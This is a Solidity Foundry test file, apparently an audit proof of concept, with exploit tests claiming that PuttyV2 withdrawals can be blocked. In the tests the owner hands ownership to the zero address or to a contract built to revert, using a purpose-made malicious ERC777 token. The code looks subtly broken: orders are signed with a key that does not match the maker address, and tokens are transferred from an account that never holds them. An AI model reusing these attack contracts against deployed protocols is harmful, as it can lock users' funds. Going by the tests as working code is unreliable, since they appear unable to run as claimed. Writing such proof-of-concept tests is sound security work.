// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/PuttyV2.sol";
import "../src/PuttyV2Nft.sol";
import "solmate/tokens/ERC20.sol";
import "solmate/tokens/WETH.sol";
import "openzeppelin/token/ERC777/ERC777.sol";
import "openzeppelin/token/ERC777/IERC777Recipient.sol";

// Malicious ERC777 token that reverts on transfer to owner
contract MaliciousERC777 is ERC777 {
    address public immutable maliciousOwner;
    
    constructor(
        address _maliciousOwner,
        uint256 initialSupply
    ) ERC777("Malicious Token", "MAL", new address[](0)) {
        _mint(_maliciousOwner, initialSupply, "", "");
        maliciousOwner = _maliciousOwner;
    }
    
    function _send(
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) internal override {
        // Revert if sending to the malicious owner
        if (to == maliciousOwner) {
            revert("Malicious owner rejects tokens");
        }
        super._send(from, to, amount, userData, operatorData);
    }
}

// Contract that always reverts when receiving ERC777 tokens
contract MaliciousRecipient is IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external pure override {
        revert("Always revert on token receipt");
    }
}

contract PuttyV2ExploitTest is Test {
    PuttyV2 public putty;
    WETH public weth;
    MaliciousERC777 public maliciousToken;
    MaliciousRecipient public maliciousRecipient;
    
    address public owner = address(0x1);
    address public maker = address(0x2);
    address public taker = address(0x3);
    
    function setUp() public {
        // Deploy WETH for testing
        weth = new WETH();
        
        // Deploy PuttyV2 with owner
        vm.prank(owner);
        putty = new PuttyV2("https://api.putty.finance/", 10, address(weth)); // 1% fee
        
        // Deploy malicious ERC777 token
        maliciousRecipient = new MaliciousRecipient();
        maliciousToken = new MaliciousERC777(address(maliciousRecipient), 1000 ether);
        
        // Fund test accounts
        vm.deal(maker, 100 ether);
        vm.deal(taker, 100 ether);
        
        // Mint WETH for testing
        vm.prank(maker);
        weth.deposit{value: 50 ether}();
        vm.prank(taker);
        weth.deposit{value: 50 ether}();
        
        // Approve Putty contract
        vm.prank(maker);
        weth.approve(address(putty), type(uint256).max);
        vm.prank(taker);
        weth.approve(address(putty), type(uint256).max);
    }
    
    function test_Exploit_ZeroAddressOwner() public {
        console.log("=== Testing Method #1: Zero Address Owner Attack ===");
        
        // Create a simple call option order
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: true,
            isLong: false, // Short call
            baseAsset: address(weth),
            strike: 10 ether,
            premium: 1 ether,
            duration: 30 days,
            expiration: block.timestamp + 60 days,
            nonce: 0,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash); // Private key for maker
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order (taker takes the long position)
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        console.log("Order filled successfully");
        console.log("Position ID:", positionId);
        
        // Transfer ownership to zero address (malicious action by current owner)
        vm.prank(owner);
        putty.transferOwnership(address(0));
        
        console.log("Ownership transferred to zero address");
        console.log("New owner:", putty.owner());
        
        // Fast forward to expiration
        vm.warp(block.timestamp + 31 days);
        
        // Try to withdraw - should fail due to zero address transfer
        vm.expectRevert(); // Should revert with ERC20 transfer to zero address error
        vm.prank(taker);
        putty.withdraw(order);
        
        console.log("Withdrawal failed as expected - funds are stuck!");
    }
    
    function test_Exploit_MaliciousERC777Owner() public {
        console.log("=== Testing Method #2: Malicious ERC777 Owner Attack ===");
        
        // Create a put option order using malicious ERC777 token
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: false,
            isLong: false, // Short put
            baseAsset: address(maliciousToken),
            strike: 100 ether,
            premium: 10 ether,
            duration: 30 days,
            expiration: block.timestamp + 60 days,
            nonce: 1,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Fund maker with malicious tokens
        vm.prank(address(maliciousToken));
        maliciousToken.transfer(maker, 200 ether);
        
        // Approve Putty contract
        vm.prank(maker);
        maliciousToken.approve(address(putty), type(uint256).max);
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        console.log("Order filled with malicious ERC777 token");
        
        // Transfer ownership to malicious recipient contract
        vm.prank(owner);
        putty.transferOwnership(address(maliciousRecipient));
        
        console.log("Ownership transferred to malicious recipient");
        
        // Fast forward to expiration
        vm.warp(block.timestamp + 31 days);
        
        // Try to withdraw - should fail due to malicious recipient reverting
        vm.expectRevert("Malicious owner rejects tokens");
        vm.prank(taker);
        putty.withdraw(order);
        
        console.log("Withdrawal failed as expected - funds are stuck!");
    }
    
    function test_DemonstrateNormalWithdrawalWorks() public {
        console.log("=== Testing Normal Withdrawal (Control Test) ===");
        
        // Create a simple call option order
        PuttyV2.Order memory order = PuttyV2.Order({
            maker: maker,
            isCall: true,
            isLong: false, // Short call
            baseAsset: address(weth),
            strike: 10 ether,
            premium: 1 ether,
            duration: 30 days,
            expiration: block.timestamp + 60 days,
            nonce: 2,
            whitelist: new address[](0),
            floorTokens: new address[](0),
            erc20Assets: new PuttyV2.ERC20Asset[](0),
            erc721Assets: new PuttyV2.ERC721Asset[](0)
        });
        
        // Sign the order
        bytes32 orderHash = putty.hashOrder(order);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(2, orderHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        
        // Fill the order
        vm.prank(taker);
        uint256 positionId = putty.fillOrder(order, signature, new uint256[](0));
        
        // Fast forward to expiration
        vm.warp(block.timestamp + 31 days);
        
        // Record balances before withdrawal
        uint256 takerBalanceBefore = weth.balanceOf(taker);
        uint256 ownerBalanceBefore = weth.balanceOf(owner);
        
        // Withdraw should work normally
        vm.prank(taker);
        putty.withdraw(order);
        
        // Check balances after withdrawal
        uint256 takerBalanceAfter = weth.balanceOf(taker);
        uint256 ownerBalanceAfter = weth.balanceOf(owner);
        
        uint256 expectedFee = (order.strike * putty.fee()) / 1000;
        uint256 expectedWithdrawal = order.strike - expectedFee;
        
        assertEq(takerBalanceAfter, takerBalanceBefore + expectedWithdrawal, "Taker should receive strike minus fee");
        assertEq(ownerBalanceAfter, ownerBalanceBefore + expectedFee, "Owner should receive fee");
        
        console.log("Normal withdrawal works correctly");
        console.log("Fee received by owner:", expectedFee);
        console.log("Strike received by taker:", expectedWithdrawal);
    }
}